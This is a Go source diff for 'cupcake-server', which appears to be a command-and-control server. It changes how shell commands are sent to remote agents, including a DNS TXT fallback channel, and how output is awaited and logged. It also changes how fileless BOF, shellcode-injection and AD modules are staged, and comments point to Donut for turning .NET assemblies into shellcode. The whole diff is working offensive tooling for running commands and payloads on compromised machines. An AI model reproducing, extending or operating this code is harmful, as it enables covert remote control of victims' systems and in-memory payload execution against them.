@@ -2,6 +2,7 @@ package services
 
 import (
 	"cupcake-server/pkg/globals"
+	"cupcake-server/pkg/model"
 	"cupcake-server/pkg/paths"
 	"cupcake-server/pkg/store"
 	"cupcake-server/pkg/utils"
@@ -18,22 +19,31 @@ import (
 
 // SendCommand sends a shell command to the agent
 func SendCommand(uuid string, command string) error {
+	_, err := SendCommandWithID(uuid, command)
+	return err
+}
+
+// SendCommandWithID sends a shell command and returns the correlation req_id
+// so callers can wait for agent stdout via CommandLog.
+func SendCommandWithID(uuid string, command string) (reqID string, err error) {
 	// OpSec: 精确过滤 UI 发送的 ping 心跳包
 	if command == `{"type":"ping"}` || command == "ping" {
-		return nil
+		return "", nil
 	}
 
 	val, ok := globals.Clients.Load(uuid)
 	if !ok {
 		// DNS-only (or temporarily offline): queue for TXT poll protocol
+		reqID = fmt.Sprintf("DNS-%d", globals.GetNextReqID())
 		DNSEnqueueCommand(uuid, command)
 		DNSRegisterTouch(uuid)
-		_ = store.CreateCommandLog(uuid, fmt.Sprintf("DNS-%d", globals.GetNextReqID()), "shell", command)
-		return nil
+		_ = store.CreateCommandLogWithSource(uuid, reqID, "shell", command, "panel", "")
+		return reqID, nil
 	}
 	client := val.(*globals.Client)
 
-	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
+	// Unique across process restarts (counter alone collides after reboot).
+	reqID = fmt.Sprintf("CMD-%d-%08x", globals.GetNextReqID(), time.Now().UnixNano()&0xffffffff)
 	msg := globals.MessageWrapper{
 		MsgType: "command",
 		Payload: globals.CommandPayload{
@@ -43,9 +53,40 @@ func SendCommand(uuid string, command string) error {
 		},
 	}
 
-	_ = store.CreateCommandLog(uuid, reqID, "shell", command)
+	if err := store.CreateCommandLogWithSource(uuid, reqID, "shell", command, "panel", ""); err != nil {
+		return "", err
+	}
+	if err := WriteEncryptedMessage(client, msg); err != nil {
+		return reqID, err
+	}
+	return reqID, nil
+}
 
-	return WriteEncryptedMessage(client, msg)
+// WaitCommandOutput polls CommandLog until completed/failed or timeout.
+// Returns the log row (may still be pending if timed out).
+func WaitCommandOutput(reqID string, timeout time.Duration) (*model.CommandLog, error) {
+	if reqID == "" {
+		return nil, fmt.Errorf("empty req_id")
+	}
+	if timeout <= 0 {
+		timeout = 30 * time.Second
+	}
+	deadline := time.Now().Add(timeout)
+	var last *model.CommandLog
+	for time.Now().Before(deadline) {
+		row, err := store.GetCommandLogByReqID(reqID)
+		if err == nil && row != nil {
+			last = row
+			if row.Status == "completed" || row.Status == "failed" {
+				return row, nil
+			}
+		}
+		time.Sleep(200 * time.Millisecond)
+	}
+	if last != nil {
+		return last, fmt.Errorf("timeout waiting for command output")
+	}
+	return nil, fmt.Errorf("command log not found: %s", reqID)
 }
 
 // ModuleHMACKeyForListener returns derive_module_key(get_aes_key()) material for a listener.
@@ -131,7 +172,7 @@ func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, 
 			ReqID:          reqID,
 		},
 	}
-	_ = store.CreateCommandLog(uuid, reqID, "module_stage", moduleID)
+	_ = store.CreateCommandLogWithSource(uuid, reqID, "module_stage", moduleID, "panel", "")
 
 	var ch chan interface{}
 	if timeout > 0 {
@@ -192,7 +233,7 @@ func SendModuleUnload(uuid, moduleID string) error {
 			ReqID:          reqID,
 		},
 	}
-	_ = store.CreateCommandLog(uuid, reqID, "module_unload", moduleID)
+	_ = store.CreateCommandLogWithSource(uuid, reqID, "module_unload", moduleID, "panel", "")
 	if err := WriteEncryptedMessage(client, msg); err != nil {
 		return err
 	}
@@ -200,22 +241,23 @@ func SendModuleUnload(uuid, moduleID string) error {
 	return nil
 }
 
-// EnsureHeavyRuntimeModule stages the sacrificial iso_host PE (not same-process DLL).
-// plugins (assets/plugins) = BOF/.NET payloads; modules id=iso_host = cupcake-iso-host.exe
-// moduleID "bof"/"dotnet" both ensure iso_host for isolated PPID spawn path.
+// EnsureHeavyRuntimeModule stages the L2 BOF runtime module (classic in-process COFF).
+// plugins (assets/plugins) = BOF payloads; module id=bof = Manual-Map image, fileless.
+// dotnet retired: convert assemblies to shellcode (e.g. Donut) and use module 'inject'.
 func EnsureHeavyRuntimeModule(uuid, moduleID string) error {
 	moduleID = strings.TrimSpace(strings.ToLower(moduleID))
-	if moduleID != "bof" && moduleID != "dotnet" && moduleID != "iso_host" {
+	if moduleID == "dotnet" || moduleID == "execute_assembly" || moduleID == "iso_host" {
+		return fmt.Errorf("module %q retired: BOF 用模块 'bof'；.NET 请转 shellcode（如 Donut）后走 'inject'", moduleID)
+	}
+	if moduleID != "bof" {
 		return fmt.Errorf("unsupported runtime module %q", moduleID)
 	}
-	// Isolated path: only need the host PE
-	hostID := "iso_host"
-	_, err := SendModuleStageWait(uuid, hostID, 45*time.Second)
+	_, err := SendModuleStageWait(uuid, "bof", 45*time.Second)
 	if err != nil {
-		// Do not treat timeout as success — BOF will fail with iso_host PE missing
+		// Do not treat timeout as success — BOF exec will fail with module missing
 		return err
 	}
-	// Brief settle so agent finishes load before first CIS1 job
+	// Brief settle so agent finishes load before first job
 	time.Sleep(400 * time.Millisecond)
 	return nil
 }
@@ -275,10 +317,16 @@ func MaybeAutoPushModule(uuid, stderr string) {
 	if id == "" {
 		return
 	}
-	// Heavy BOF/.NET product path needs iso_host, not legacy bof/dotnet DLL
+	// Agent reports the actual product module id (bof | inject | ad)
 	stageID := id
-	if id == "bof" || id == "dotnet" {
-		stageID = "iso_host"
+	// Platform gate: never auto-push windows-only modules (bof/inject/ad) to non-windows agents.
+	if val, ok := globals.Clients.Load(uuid); ok {
+		if cl, ok2 := val.(*globals.Client); ok2 {
+			if !IsModuleSupportedOnOS(stageID, cl.OS) {
+				log.Printf("[Module] auto-push %s refused: module not supported on agent OS=%q", stageID, cl.OS)
+				return
+			}
+		}
 	}
 	if _, err := SendModuleStageWait(uuid, stageID, 25*time.Second); err != nil {
 		log.Printf("[Module] auto-push %s → %s failed: %v (upload module to storage/modules first)", stageID, uuid, err)
